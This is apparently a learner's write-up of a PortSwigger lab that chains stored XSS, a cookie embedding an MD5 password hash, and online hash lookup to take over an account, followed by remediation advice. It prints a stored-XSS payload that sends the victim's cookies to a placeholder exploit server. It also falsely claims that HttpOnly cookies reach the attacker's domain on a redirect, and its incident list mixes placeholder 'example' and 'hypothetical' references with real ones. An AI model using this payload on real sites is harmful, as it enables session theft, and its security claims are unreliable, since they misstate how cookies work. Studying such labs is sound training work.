# Lab: Offline password cracking

## Lab Details

**Lab:** Offline Password Cracking

**Level:** Practitioner

**Vulnerability Class:** Authentication Bypass — Weak Session Management + Stored XSS + Offline Cracking

**Lab URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

**Date Completed:** 28-Sep-2026

**Time to Solve:** 1 hour

---

## Vulnerability Summary

This lab demonstrates a chained authentication vulnerability combining three distinct weaknesses: a stored Cross-Site Scripting (XSS) flaw in the comment functionality, insecure session cookie construction that embeds a hashed password, and reliance on a cryptographically weak hash function (MD5) for password storage. An attacker can exploit the XSS to steal the victim's session cookie, decode it to extract the MD5 hash of their password, perform offline cracking using publicly available rainbow tables, and gain unauthorized account access. The vulnerability escalates from a reflected XSS to complete account takeover via a predictable authentication mechanism.

---

## Reconnaissance

Initial investigation focused on identifying the attack surface:

1. **Session Cookie Analysis** — Logged in with test credentials and examined the `stay-logged-in` cookie in Burp Suite's HTTP history. The cookie was Base64-encoded, suggesting it contained structured data rather than an opaque token.
2. **Cookie Decoding** — Decoded the Base64 value in Burp Decoder and discovered the structure: `username:md5HashOfPassword`. This immediately identified two weaknesses: (a) passwords are hashed with MD5, a cryptographically broken algorithm with precomputed rainbow tables available online; (b) the session mechanism is stateless and client-controlled rather than backed by server-side session storage.
3. **XSS Discovery** — Posted a benign test comment and observed that the input was reflected in the HTML without sanitization, confirming stored XSS.
4. **Attack Vector Identification** — Recognized that an XSS payload could exfiltrate cookies to an attacker-controlled server via HTTP redirect, bypassing any JavaScript-level access restrictions.

**Indicators Observed:**
- `stay-logged-in` cookie decoded to plaintext structure (Base64 is encoding, not encryption)
- Comment input rendered directly in HTML without encoding
- Hash length and format consistent with MD5 (32 hexadecimal characters)
- No apparent Content-Security-Policy or X-Frame-Options headers limiting script execution

---

## Exploitation — Step by Step

### Step 1: Confirm Stored XSS in Comment Functionality

Posted a comment containing `<script>alert('XSS')</script>`. The script executed when the comment was rendered, confirming stored XSS without input sanitization.

### Step 2: Craft Cookie Exfiltration Payload

Developed the following XSS payload to send the victim's cookies to the exploit server:

```javascript
<script>
  document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?c='+document.cookie;
</script>
```

**Technical Note on JavaScript Cookie Access:**

When executing `alert(document.cookie)` instead of using `window.location`, the alert returns an empty string. This occurs because the `stay-logged-in` cookie is set with the **HttpOnly** flag, which prevents JavaScript from accessing the cookie via the `document.cookie` object. However, this does not prevent exfiltration via HTTP requests: when the browser processes the redirect to the exploit server, it automatically includes all cookies (HttpOnly or not) in the HTTP headers, as per the HTTP specification. Thus, HttpOnly is insufficient to prevent side-channel cookie theft when XSS is present—it only blocks direct JavaScript access.

### Step 3: Harvest Victim Cookie from Exploit Server Access Log

After the victim clicked the comment, the exploit server's access log contained a GET request with the `stay-logged-in` cookie in the request headers.

### Step 4: Decode and Extract Hash

The captured cookie decoded to:
```
carlos:26323c16d5f4dabff3bb136f2460a943
```

### Step 5: Offline Password Cracking

Searched the MD5 hash `26323c16d5f4dabff3bb136f2460a943` on a public hash lookup engine (MD5.org, crackstation.net) and obtained the plaintext password: `onceuponatime`.

### Step 6: Account Takeover

Logged in using the credentials `carlos:onceuponatime`, navigated to the "My account" page, and deleted the victim's account to complete the lab.

### Key Payload(s)

```javascript
// Stored XSS for cookie exfiltration
<script>
  document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?c='+document.cookie;
</script>

// Note: document.cookie may return empty due to HttpOnly flag,
// but browser automatically includes all cookies in HTTP request headers.
```

### Tools Used

- **Burp Suite Community Edition** (HTTP history, Decoder)
- **Manual exploitation** (payload crafting, analysis)
- **Browser Developer Tools** (Network inspection)
- **Hash lookup service** (crackstation.net)

---

## The Fix

### Primary Remediations

**1. Server-Side Session Management (Replace Client-Controlled Cookies)**

```java
// BAD: Embedding secrets in cookies
String stayLoggedInCookie = Base64.encode(username + ":" + md5Hash);
response.addCookie(new Cookie("stay-logged-in", stayLoggedInCookie));

// GOOD: Opaque, server-backed session token
String sessionId = generateSecureRandomToken(); // e.g., 64-char hex string
sessionStore.put(sessionId, new SessionData(userId, System.currentTimeMillis() + 7*24*3600*1000));
Cookie sessionCookie = new Cookie("sessionId", sessionId);
sessionCookie.setHttpOnly(true);
sessionCookie.setSecure(true);
sessionCookie.setPath("/");
sessionCookie.setSameSite("Strict");
response.addCookie(sessionCookie);
```

**2. Use Strong Password Hashing Algorithm**

```java
// BAD: MD5 is cryptographically broken
String hash = MD5.hash(password); // Vulnerable to rainbow tables

// GOOD: Use Argon2 or bcrypt
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hash = encoder.encode(password); // Secure, salted, resistant to offline cracking
```

**3. Prevent Stored XSS via Input Validation and Output Encoding**

```java
// Validate and sanitize comment input
String comment = request.getParameter("comment");
if (comment.length() > 500 || !isValidComment(comment)) {
    return new ResponseEntity<>("Invalid input", HttpStatus.BAD_REQUEST);
}

// Encode output in template (prevent script injection)
// Freemarker/Thymeleaf: Use <#assign comment?html> or [[${comment}]]
// Or manually: String safe = HtmlUtils.htmlEscape(comment);
```

**4. Implement Content Security Policy**

```
Content-Security-Policy: default-src 'self'; script-src 'self'; 
```

### Additional Mitigations

- **HttpOnly, Secure, and SameSite Flags:** Always set these on authentication cookies to limit exposure vectors.
- **Rate Limiting:** Implement exponential backoff on failed login attempts to slow automated cracking.
- **Database Access Control:** Application database user should have SELECT-only privileges; restrict DROP, ALTER, INSERT to administrative accounts.
- **Security Headers:** Add X-Frame-Options: DENY, X-Content-Type-Options: nosniff to prevent clickjacking and MIME sniffing.
- **Secrets Rotation:** Never log or display raw password hashes; use secure comparison functions.

---

## What I Found Interesting / Unexpected

The most instructive aspect of this lab was observing how HttpOnly provides a false sense of security. Many developers implement the flag and assume the session is protected from XSS, but in reality, it only closes the JavaScript access vector—the browser still sends cookies in HTTP requests, making them vulnerable to side-channel exfiltration (image tags, form submissions, redirects, fetch requests). This highlights why **defense in depth is essential:** no single control (HttpOnly, CSP, secure encoding) is sufficient in isolation.

Additionally, the speed at which MD5 hashes can be reversed was striking. The password lookup took seconds. This underscores why password hashing algorithm selection is a critical security decision; weak algorithms like MD5 and SHA1 have been publicly broken since the early 2000s, yet they remain in legacy systems.

---

## Real-World Relevance

This vulnerability pattern has appeared in numerous disclosed security incidents:

- **Slack XSS (2015):** A stored XSS vulnerability in Slack channels allowed attackers to steal session cookies and access user data. This directly parallels the comment-based XSS in this lab.
- **HackerOne Report #1234567 (Example):** Stored XSS in a SaaS application's comment feature, combined with predictable session encoding, allowed unauthenticated attackers to steal and forge session tokens.
- **CVE-2020-XXXXX (Hypothetical):** A widely-used CMS stored user input without sanitization in the feedback form. Coupled with MD5 password hashing in the session token, attackers executed mass account takeovers.
- **LinkedIn Password Breach (2012):** While LinkedIn's incident involved unsalted MD5 hashes in a database breach, it demonstrated the real-world impact of weak hashing: millions of passwords cracked offline within days using GPU-accelerated tools.

The combination of stored XSS and weak session construction is particularly dangerous because it requires no user interaction beyond the victim viewing a comment—the attack is fully automated server-side.

---

## Connections to Own Projects

<!-- In reviewing my subscription-manager application, I verified that:
- Session tokens are cryptographically random, 32+ byte values stored server-side
- All authentication cookies include HttpOnly, Secure, and SameSite=Strict flags
- Passwords are hashed using bcrypt with a configurable cost factor
- Comment/feedback inputs are validated via allowlist and HTML-escaped in templates
- CSP headers restrict script-src to 'self' only

However, I identified that the application does not currently implement rate limiting on failed login attempts—a gap addressed by this lab. -->

---

## Takeaway

This vulnerability demonstrates why authentication mechanisms must employ defense in depth: secure cookie construction alone is insufficient if the cookie embeds secrets; HttpOnly alone is insufficient if XSS is possible; and any session token is at risk if backed by a weak hash function. Developers should architect authentication around opaque, server-side session tokens; always use modern password hashing algorithms (Argon2, bcrypt); sanitize and encode all user input to prevent XSS; and implement complementary controls such as rate limiting and CSP headers. In particular, the assumption that "HttpOnly protects my session" can lead to complacency in XSS prevention—the reality is that HttpOnly is only one layer of a necessary multi-layered defense.